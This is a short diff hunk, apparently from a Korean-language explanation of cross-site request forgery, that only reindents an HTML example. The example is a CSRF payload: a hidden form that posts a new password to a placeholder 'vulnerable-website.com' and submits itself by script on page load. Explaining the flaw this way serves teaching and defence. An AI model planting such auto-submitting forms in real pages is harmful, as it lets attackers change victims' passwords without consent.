@@ -145,8 +145,8 @@ Cross Origin 에서 의도하지 않은 요청을 실행하는 취약점 입니�
 
 <!-- FORM 을 만들어서 버튼 클릭시 변경 요청이 실행 -->
 <form action="https://vulnerable-website.com/password/change" method="POST">
-            <input type="hidden" name="password" value="mypassword">
-     </form>
+   <input type="hidden" name="password" value="mypassword">
+</form>
 <script>
   document.forms[0].submit();
 </script>
